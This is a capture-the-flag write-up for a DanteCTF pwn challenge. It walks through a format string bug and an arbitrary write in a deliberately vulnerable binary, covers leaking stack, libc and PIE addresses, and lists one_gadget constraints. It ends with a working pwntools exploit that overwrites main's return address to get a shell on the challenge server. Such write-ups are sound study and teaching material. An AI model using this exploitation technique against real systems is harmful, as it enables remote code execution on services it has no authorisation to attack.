This was a really easy challenge in my opinion, and I first blooded it in the CTF :)

The logic is pretty simple

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 *circle; // [rsp+8h] [rbp-18h] BYREF
  __int64 hell_send; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Please, tell me your name: ");
  fgets(your_name, 12, stdin);
  your_name[strcspn(your_name, "\n")] = 0;
  printf("Hi, ");
  printf(your_name);
  puts(" give me a soul you want to send to hell: ");
  __isoc99_scanf("%lu", &hell_send);
  getchar();
  puts("and in which circle you want to put him/her: ");
  __isoc99_scanf("%lu", &circle);
  getchar();
  *circle = hell_send;
  puts("Done, bye!");
  return 0;
}
```

We can enter a name, which it will print to the user using printf, which is a Format String Bug.
then, we can basiclly write to any location we want.

The binary is compiled with FULL-RELRO, Stack Canary, PIE and NX.
if FULL-RELRO wasn't enable, I would've just leaked libc using the fsb and do a GOT overwrite to system.
now that it does enabled, we can just get a stack leak from the fsb, and write into main's return pointer, and thats what I did.
I also leaked libc address using the fsb, and leaked PIE (cause why not :))

The most easy win wouldv'e just to use a one_gadget. those are the available gadgets on the provided libc:
```
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

We can see that the last 3 requries rbp-0x78 to be writable, but its not possible for us since we are overwriting the main's return pointer.
We'll try to use the first one. those are the registers when main's ret is triggered:
```
 RAX  0x0
 RBX  0x0
 RCX  0x7fc578914a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7fc578a1ba70 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x1
 R8   0xa
 R9   0x0
 R10  0x7fc5789beac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 R11  0x246
 R12  0x7ffcba8415b8 —▸ 0x7ffcba8422a4 ◂— '/media/itay/Data/DanteCTF/pwn/sentence/bin'
 R13  0x55cce994e229 (main) ◂— endbr64 
 R14  0x55cce9950d88 —▸ 0x55cce994e1e0 ◂— endbr64 
 R15  0x7fc578bc4040 (_rtld_global) —▸ 0x7fc578bc52e0 —▸ 0x55cce994d000 ◂— 0x10102464c457f
*RBP  0x1
*RSP  0x7ffcba8414b8 —▸ 0x7fc578850a37 (do_system+327) ◂— xor edx, edx
 RIP  0x55cce994e3a9 (main+384) ◂— ret 
```
RCX == NULL, thats good , but rsp is not aligned correctly nor RBP == 1.
BUT, we can see that after the ret instruction [$rsp] == 0, and its 16 bit aligned:
```
pwndbg> x/1gx $rsp
0x7ffd9820ca90:	0x0000000000000000
```
which mean, that the next leave; ret instruction will satisfy the first one_gadget conditions!
so our approach will be to jump back to main, overwrite the return pointer again, to just our one_gadget.

exploit:

```py
from pwn import *
elf = ELF("./bin")
def exploit():
	p = remote('challs.dantectf.it', 31531)


    name = b"%p%13$p%3$p"

    p.recvuntil(b"name:")
    p.sendline(name)
    p.recvuntil(b"Hi, ")
    leak = p.recvline().split(b"0x")

    stack_leak = int(leak[1],16)
    base_leak = main_start = int(leak[2],16)
    libc_leak = int(leak[3].split()[0],16)
    ret_addr = stack_leak + 0x2148
    libc_base = libc_leak - 0x114a37
    #333
    one_gadget = libc_base + 0x50a37
    #333
    pie_base = base_leak - 0x1229
    print(hex(ret_addr),hex(libc_base),hex(pie_base))

    p.sendline(str(main_start+0x5)) 
    p.recvuntil(b"her:")
    p.sendline(str(ret_addr))


    p.recvuntil(b"name:")
    p.sendline(name)

    #jump to one_gadget
    p.recvuntil(b"hell:")
    p.sendline(str(one_gadget))
    p.recvuntil(b"her:")
    p.sendline(str(ret_addr+0x10))

    p.interactive()

if __name__ == '__main__':
    exploit()

```
